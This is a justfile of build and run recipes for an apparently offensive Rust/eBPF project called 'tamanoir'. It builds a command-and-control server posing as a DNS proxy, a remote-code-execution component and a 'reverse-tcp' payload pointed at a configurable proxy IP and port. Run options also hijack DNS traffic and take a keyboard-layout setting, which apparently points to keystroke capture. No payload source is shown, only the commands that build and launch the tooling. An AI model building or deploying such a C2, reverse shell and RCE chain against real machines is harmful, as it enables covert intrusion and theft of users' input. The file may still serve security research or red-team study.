set export
_default:
    @just --list


build-ebpf:
    cd tamanoir-ebpf && cargo build --release

build-rce payload="hello":
    cd tamanoir-rce &&  just build {{payload}} && cargo build  --release

run-rce:
    cd tamanoir-rce && sudo -E target/release/tamanoir-rce

build_reverse_shell proxy_ip="192.168.1.15" rce_port="8082":
    IP=$(just _atoi {{proxy_ip}}) PORT={{rce_port}} just build-rce reverse-tcp


# Build
build:
    just build-ebpf
    cargo build -p tamanoir-c2 --release 
    cargo build -p tamanoir --release

# Run
run proxy_ip hijack_ip="8.8.8.8" layout="1" log_level="info":
    RUST_LOG={{log_level}} sudo -E target/release/tamanoir --proxy-ip {{proxy_ip}} --hijack-ip {{hijack_ip}} --layout {{layout}}

# Run the proxy
proxy dns_ip="8.8.8.8" port="53" payload_len="8" log_level="info" rce="hello" target_arch="x86_64":
    RUST_LOG={{log_level}} sudo -E ./target/release/tamanoir-c2  --port {{port}} \
    --dns-ip {{dns_ip}} \
    --payload-len {{payload_len}} \
    --rce {{rce}} \
    --target_arch {{target_arch}}

_atoi ipv4_address:
	#!/usr/bin/env bash
	IP={{ipv4_address}}; IPNUM=0
	for (( i=0 ; i<4 ; ++i )); do
	((IPNUM+=${IP%%.*}*$((256**$((3-${i}))))))
	IP=${IP#*.}
	done
	echo $IPNUM 

